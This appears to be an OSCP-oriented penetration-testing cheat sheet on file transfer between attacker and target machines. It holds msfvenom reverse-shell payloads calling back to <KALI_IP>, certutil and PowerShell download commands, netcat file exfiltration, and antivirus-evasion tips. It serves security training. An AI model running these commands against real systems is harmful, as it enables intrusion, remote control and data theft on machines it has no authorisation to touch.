# File Transfer Techniques

Transferring files between your attack machine and target systems is a crucial skill during penetration testing. This document covers various techniques for moving files between Linux and Windows systems.

## Linux to Windows File Transfers

### Using SMB Server

One of the most reliable methods to transfer files from Kali Linux to Windows is using an SMB server:

```bash
# On Kali - Start an SMB server in the current directory
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share_name .

# On Windows - Copy file from the SMB share
copy \\<KALI_IP>\share_name\file.exe C:\destination\file.exe
```

**Example with reverse shell transfer:**

1. Generate a reverse shell executable on Kali:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe
   ```

2. Start SMB server on Kali in the same directory as reverse.exe:
   ```bash
   sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
   ```

3. On Windows, copy the file:
   ```cmd
   copy \\<KALI_IP>\kali\reverse.exe C:\PrivEsc\reverse.exe
   ```

4. Set up listener on Kali before executing:
   ```bash
   sudo nc -nvlp 53
   ```

5. Run the executable on Windows:
   ```cmd
   C:\PrivEsc\reverse.exe
   ```

### Using HTTP Server

Another common method is to use a simple HTTP server:

```bash
# On Kali - Start a Python HTTP server
python3 -m http.server 8000

# On Windows - Download using PowerShell
powershell -c "Invoke-WebRequest -Uri 'http://<KALI_IP>:8000/file.exe' -OutFile 'C:\destination\file.exe'"
# Alternative PowerShell method
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<KALI_IP>:8000/file.exe', 'C:\destination\file.exe')"

# On Windows - Download using certutil
certutil -urlcache -split -f "http://<KALI_IP>:8000/file.exe" C:\destination\file.exe
```

### Using FTP Server

FTP can be useful when other methods are blocked:

```bash
# On Kali - Install and configure Python ftplib
sudo apt update
sudo apt install python3-pyftpdlib
python3 -m pyftpdlib -p 21 --write

# On Windows - Use native FTP client (create a script.txt file first)
echo open <KALI_IP> 21> ftp_commands.txt
echo anonymous>> ftp_commands.txt
echo password>> ftp_commands.txt
echo binary>> ftp_commands.txt
echo get file.exe>> ftp_commands.txt
echo bye>> ftp_commands.txt
ftp -s:ftp_commands.txt
```

## Windows to Linux File Transfers

### Using SMB Server

```bash
# On Kali - Start SMB server with write permissions
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username user -password password share_name /path/to/share

# On Windows - Copy file to SMB share
copy C:\path\to\file.txt \\<KALI_IP>\share_name\
```

### Using Netcat

```bash
# On Kali - Set up listener to receive file
nc -nlvp 4444 > received_file.txt

# On Windows - Send file
type C:\path\to\file.txt | nc <KALI_IP> 4444
```

### Using Base64 Encoding

For small text files, base64 encoding/decoding can be used:

```bash
# On Windows - Encode file to base64
certutil -encode C:\path\to\file.txt encoded.b64

# Copy the base64 text and on Kali
echo "PASTE_BASE64_HERE" | base64 -d > file.txt
```

## Creating Reverse Shells

### Windows Reverse Shells

```bash
# Basic TCP reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f exe -o reverse.exe

# PowerShell reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f psh -o reverse.ps1

# DLL reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f dll -o reverse.dll
```

### Linux Reverse Shells

```bash
# Basic TCP reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=53 -f elf -o reverse

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=<KALI_IP> LPORT=53 -f raw -o reverse.py
```

## Tips for OSCP

1. **Always have multiple file transfer methods ready** - Different environments may block different protocols
2. **Use uncommon ports for reverse shells** - Ports like 443, 53, 80 are less likely to be blocked
3. **Create a directory of common payloads before the exam** - Save time during the exam
4. **Test your reverse shells before uploading** - Make sure they work with your specific IP/port
5. **Be mindful of antivirus** - Some transfer methods or payloads may trigger AV detection

## Common Issues and Solutions

### SMB Connection Refused
- Ensure you're running the SMB server with sudo
- Check for firewall rules blocking port 445
- Try using the `-smb2support` flag

### Antivirus Blocking Transfers
- Encode or encrypt executables
- Use alternative transfer methods like Base64
- Split the file into smaller chunks

### Permission Issues
- Check file permissions after transfer
- Use `icacls` on Windows or `chmod` on Linux to set proper permissions
- When using SMB, ensure the server allows write access if needed

Remember to clean up your tools and payloads after completing your tasks to avoid leaving evidence behind. 